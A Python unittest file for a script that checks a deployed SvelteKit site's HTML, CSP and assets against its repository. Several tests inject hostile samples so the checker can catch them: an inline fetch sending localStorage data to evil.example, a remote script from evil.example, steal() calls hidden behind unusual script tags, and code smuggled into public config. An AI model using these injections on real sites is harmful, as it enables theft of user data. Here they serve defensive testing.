import unittest
from pathlib import Path

from scripts.verify_deployment import (
    check_csp,
    declared_script_sources,
    check_shell,
    compare,
    hash_tree,
    site_path,
)

APP_HTML = Path("src/app.html").read_text()
WRANGLER = Path("wrangler.jsonc").read_text()
THEME = APP_HTML.split("<script", 1)[1].split(">", 1)[1].split("</script>", 1)[0]
ASSETS = {
    "/_app/immutable/entry/start.AAA.js": "a",
    "/_app/immutable/entry/app.BBB.js": "b",
    "/_app/immutable/assets/app.CCC.css": "c",
}
BOOT = """{
	__sveltekit_8j9qqy = {
		base: new URL(".", location).pathname.slice(0, -1)
	};

	const element = document.currentScript.parentElement;

	Promise.all([
		import("./_app/immutable/entry/start.AAA.js"),
		import("./_app/immutable/entry/app.BBB.js")
	]).then(([kit, app]) => {
		kit.start(app, element);
	});
}"""


def page(*extra: str, boot: str = BOOT, theme: str = THEME) -> str:
    return (
        "<html><head>"
        f'<script nonce="abc">{theme}</script>'
        '<link href="./_app/immutable/assets/app.CCC.css" rel="stylesheet">'
        + "".join(extra)
        + f'</head><body><script nonce="abc">{boot}</script></body></html>'
    )


class ShellTests(unittest.TestCase):
    def test_accepts_the_page_the_repository_produces(self):
        self.assertEqual(check_shell(page(), APP_HTML, ASSETS, WRANGLER), [])

    def test_catches_an_injected_inline_script(self):
        problems = check_shell(
            page('<script nonce="abc">fetch("https://evil.example/" + localStorage.key(0))</script>'),
            APP_HTML,
            ASSETS,
            WRANGLER,
        )
        self.assertTrue(any("inline script the repository does not" in p for p in problems))

    def test_catches_a_script_hidden_behind_an_unusual_end_tag(self):
        # `</script >` is valid HTML and closes the element in a browser.
        problems = check_shell(
            page('<script nonce="abc">steal()</script ><script nonce="abc">ok()</script>'),
            APP_HTML,
            ASSETS,
            WRANGLER,
        )
        self.assertTrue(any("steal()" in p for p in problems))

    def test_catches_a_third_party_script_with_an_unquoted_source(self):
        # Valid HTML, and the browser loads it. A quote-matching pattern would see
        # an empty inline script here and move on.
        problems = check_shell(
            page("<script src=https://evil.example/x.js></script>"), APP_HTML, ASSETS, WRANGLER
        )
        self.assertTrue(any("evil.example" in p for p in problems))

    def test_catches_an_uppercase_script_tag(self):
        problems = check_shell(page('<SCRIPT nonce="abc">steal()</SCRIPT>'), APP_HTML, ASSETS, WRANGLER)
        self.assertTrue(any("steal()" in p for p in problems))

    def test_catches_a_script_loaded_from_another_origin(self):
        problems = check_shell(
            page('<script src="https://cdn.example/analytics.js"></script>'), APP_HTML, ASSETS, WRANGLER
        )
        self.assertTrue(any("cdn.example" in p for p in problems))

    def test_catches_a_same_origin_script_that_is_not_in_the_build(self):
        problems = check_shell(page('<script src="/extra.js"></script>'), APP_HTML, ASSETS, WRANGLER)
        self.assertTrue(any("/extra.js" in p for p in problems))

    def test_catches_an_altered_theme_script(self):
        problems = check_shell(page(theme=THEME + ";steal()"), APP_HTML, ASSETS, WRANGLER)
        self.assertTrue(any("theme script" in p for p in problems))

    def test_catches_a_boot_script_pointing_at_other_code(self):
        problems = check_shell(
            page(boot=BOOT.replace("app.BBB.js", "app.EVIL.js")), APP_HTML, ASSETS, WRANGLER
        )
        self.assertTrue(any("app.EVIL.js" in p for p in problems))

    def test_catches_a_boot_script_that_does_more_than_boot(self):
        problems = check_shell(
            page(boot=BOOT.replace("kit.start(app, element);", "kit.start(app, element); steal();")),
            APP_HTML,
            ASSETS,
            WRANGLER,
        )
        self.assertTrue(any("template" in p for p in problems))

    def test_catches_a_stylesheet_that_is_not_in_the_build(self):
        problems = check_shell(
            page('<link href="./_app/immutable/assets/other.css" rel="stylesheet">'), APP_HTML, ASSETS, WRANGLER
        )
        self.assertTrue(any("other.css" in p for p in problems))


SVELTE_CONFIG = Path("svelte.config.js").read_text()
DECLARED = "script-src 'self' 'nonce-xyz'"


WITH_ENV = BOOT.replace(
    'base: new URL(".", location).pathname.slice(0, -1)',
    'base: new URL(".", location).pathname.slice(0, -1),\n\t\tenv: {"PUBLIC_TURNSTILE_ORIGIN":"https://verify.scrapscache.com"}',
)


class PublicEnvTests(unittest.TestCase):
    def test_accepts_public_configuration_the_repository_declares(self):
        self.assertEqual(check_shell(page(boot=WITH_ENV), APP_HTML, ASSETS, WRANGLER), [])

    def test_catches_a_value_the_repository_does_not_declare(self):
        boot = WITH_ENV.replace("https://verify.scrapscache.com", "https://verify.attacker.example")
        problems = check_shell(page(boot=boot), APP_HTML, ASSETS, WRANGLER)
        self.assertTrue(any("does not declare" in p for p in problems))

    def test_catches_code_smuggled_into_the_configuration(self):
        boot = WITH_ENV.replace(
            '"https://verify.scrapscache.com"}', '"https://verify.scrapscache.com", "x": steal()}'
        )
        problems = check_shell(page(boot=boot), APP_HTML, ASSETS, WRANGLER)
        self.assertTrue(problems)

    def test_catches_a_non_public_key(self):
        boot = WITH_ENV.replace("PUBLIC_TURNSTILE_ORIGIN", "TURNSTILE_SECRET")
        problems = check_shell(page(boot=boot), APP_HTML, ASSETS, WRANGLER)
        self.assertTrue(problems)


class CspTests(unittest.TestCase):
    def test_accepts_the_policy_the_repository_declares(self):
        self.assertEqual(check_csp(f"default-src 'self'; {DECLARED}", SVELTE_CONFIG), [])

    def test_reads_the_declared_policy_from_the_repository_itself(self):
        self.assertEqual(
            declared_script_sources("'script-src': ['self', 'https://challenges.cloudflare.com'],"),
            {"'self'", "https://challenges.cloudflare.com"},
        )

    def test_catches_turnstile_being_allowed_to_run_on_the_notes_origin(self):
        problems = check_csp(f"{DECLARED} https://challenges.cloudflare.com", SVELTE_CONFIG)
        self.assertEqual(
            problems,
            ["script-src allows sources the repository does not declare: https://challenges.cloudflare.com"],
        )

    def test_catches_a_source_the_repository_does_not_declare(self):
        problems = check_csp(f"{DECLARED} https://cdn.example", SVELTE_CONFIG)
        self.assertEqual(
            problems, ["script-src allows sources the repository does not declare: https://cdn.example"]
        )

    def test_catches_unsafe_inline_being_added(self):
        self.assertTrue(check_csp(f"{DECLARED} 'unsafe-inline'", SVELTE_CONFIG))

    def test_catches_a_missing_policy(self):
        self.assertTrue(check_csp(None, SVELTE_CONFIG))


class CompareTests(unittest.TestCase):
    def test_reports_changed_and_missing_files(self):
        problems = compare({"/a.js": "1", "/b.js": "2", "/c.js": "3"}, {"/a.js": "1", "/b.js": "X"})
        self.assertEqual(problems, ["differs from the build: /b.js", "missing on the site: /c.js"])

    def test_leaves_platform_files_out_of_what_is_expected_to_be_served(self):
        import tempfile

        with tempfile.TemporaryDirectory() as root:
            for name in ("_worker.js", "_headers", ".assetsignore", "index.js"):
                Path(root, name).write_text("x")
            self.assertEqual(list(hash_tree(Path(root))), ["/index.js"])


class PathTests(unittest.TestCase):
    def test_resolves_references_on_this_site(self):
        self.assertEqual(site_path("./_app/x.js"), "/_app/x.js")
        self.assertEqual(site_path("/icon.png"), "/icon.png")

    def test_treats_other_origins_as_leaving_the_site(self):
        self.assertIsNone(site_path("https://cdn.example/x.js"))
        self.assertIsNone(site_path("//cdn.example/x.js"))
        self.assertIsNone(site_path("data:text/javascript,alert(1)"))


if __name__ == "__main__":
    unittest.main()
